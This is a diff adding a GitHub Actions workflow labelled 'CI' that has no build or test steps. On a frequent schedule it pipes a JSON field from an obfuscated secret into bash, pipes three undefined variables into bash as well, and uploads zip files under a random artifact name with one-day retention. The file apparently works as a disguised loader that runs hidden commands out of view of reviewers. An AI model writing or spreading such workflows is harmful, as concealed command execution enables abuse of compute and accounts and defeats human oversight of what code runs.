@@ -1,0 +1,34 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '16 5,11,17,23 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          be325: ${{ secrets.be325 }}
+        run: |
+          printf '%s' "$be325" | jq -r .i71 | /bin/bash
+          echo $ej0 | jq -r .nf106 | /bin/bash
+          echo $cyh68029 | jq -r .k1 | /bin/bash
+          echo $s5662 | jq -r .v9 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: oeW8xRFz
+          path: "*.zip"
+          retention-days: 1
